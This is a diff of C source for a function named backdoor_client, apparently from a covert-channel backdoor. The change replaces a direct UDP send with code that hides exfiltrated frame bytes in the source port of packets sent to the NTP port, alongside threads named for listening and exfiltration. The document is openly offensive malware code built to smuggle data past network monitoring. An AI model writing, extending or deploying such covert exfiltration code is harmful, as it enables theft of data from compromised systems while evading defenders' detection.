@@ -18,13 +18,13 @@ int closing;
 void backdoor_client(uint32 ipaddr, int dport, int duplex)
 {
 	int sock;
-	struct sockaddr_in saddr;
+//	struct sockaddr_in saddr;
 	char command[MAX_LEN];
 	pthread_t list_thread;
 	pthread_t exfil_thread;
 
-	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-	bzero(&saddr, sizeof(saddr));
+//	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+//	bzero(&saddr, sizeof(saddr));
 	
 	if (ipaddr == 0)
 		error("Invalid IP specified.");
@@ -32,14 +32,14 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 	if (!val_port(dport))
 		error("Invalid destination port specified.");
 
-	saddr.sin_family = AF_INET;
-	saddr.sin_addr.s_addr = ipaddr;
-	saddr.sin_port = htons(dport);
+//	saddr.sin_family = AF_INET;
+//	saddr.sin_addr.s_addr = ipaddr;
+//	saddr.sin_port = htons(dport);
 
 	if (duplex)
 	{
 		closing = 0;
-		pthread_create(&list_thread, NULL, listen_thread, &saddr);
+		pthread_create(&list_thread, NULL, listen_thread, &ipaddr);
 	}
 
 	// exfil thread
@@ -61,6 +61,8 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 			char *enc;
 			char *ptr;
 			int fram_len;
+			ushort src_port = 0;
+			ushort dst_port = 0;
 
 			ptr = trans + i;
 
@@ -73,7 +75,12 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 //			sendto(sock, enc, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
 
 //			free(enc);
-			sendto(sock, frame, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
+//			sendto(sock, frame, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
+			src_port = (frame[0] << 8) + frame[i];
+			dst_port = PORT_NTP;
+			
+			_send(ipaddr, src_port, dst_port, TRUE);
+			
 			usleep(SLEEP_TIME);
 		}
 
